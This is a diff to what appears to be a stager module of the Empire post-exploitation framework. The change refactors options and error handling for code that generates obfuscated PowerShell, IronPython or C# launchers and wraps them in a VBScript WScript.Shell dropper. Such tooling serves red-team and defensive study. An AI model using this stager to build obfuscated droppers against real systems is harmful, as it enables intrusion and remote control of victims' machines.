@@ -1,6 +1,4 @@
-import logging
-
-log = logging.getLogger(__name__)
+from empire.server.core.exceptions import StagerGenerationException
 
 
 class Stager:
@@ -36,11 +34,6 @@ class Stager:
                 "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
-            "StagerRetries": {
-                "Description": "Times for the stager to retry connecting.",
-                "Required": False,
-                "Value": "0",
-            },
             "OutFile": {
                 "Description": "Filename that should be used for the generated output.",
                 "Required": False,
@@ -49,9 +42,7 @@ class Stager:
             "Obfuscate": {
                 "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
                 "DependsOn": [{"name": "Language", "values": ["powershell"]}],
             },
             "ObfuscateCommand": {
@@ -91,25 +82,10 @@ class Stager:
         user_agent = self.options["UserAgent"]["Value"]
         proxy = self.options["Proxy"]["Value"]
         proxy_creds = self.options["ProxyCreds"]["Value"]
-        stager_retries = self.options["StagerRetries"]["Value"]
-
-        obfuscate_script = False
-        if obfuscate.lower() == "true":
-            obfuscate_script = True
+        obfuscate_script = obfuscate
 
         if language in ["csharp", "ironpython"]:
-            if (
-                self.mainMenu.listenersv2.get_active_listener_by_name(
-                    listener_name
-                ).info["Name"]
-                != "HTTP[S]"
-            ):
-                log.error(
-                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
-                )
-                return ""
-
-            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
+            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner_routed(
                 language=language,
                 obfuscate=obfuscate_script,
                 obfuscation_command=obfuscate_command,
@@ -127,12 +103,10 @@ class Stager:
                 user_agent=user_agent,
                 proxy=proxy,
                 proxy_creds=proxy_creds,
-                stager_retries=stager_retries,
             )
 
-        if launcher == "":
-            log.error("[!] Error in launcher command generation.")
-            return ""
+        if not launcher:
+            raise StagerGenerationException("Error in launcher command generation.")
 
         code = "Dim objShell\n"
         code += 'Set objShell = WScript.CreateObject("WScript.Shell")\n'
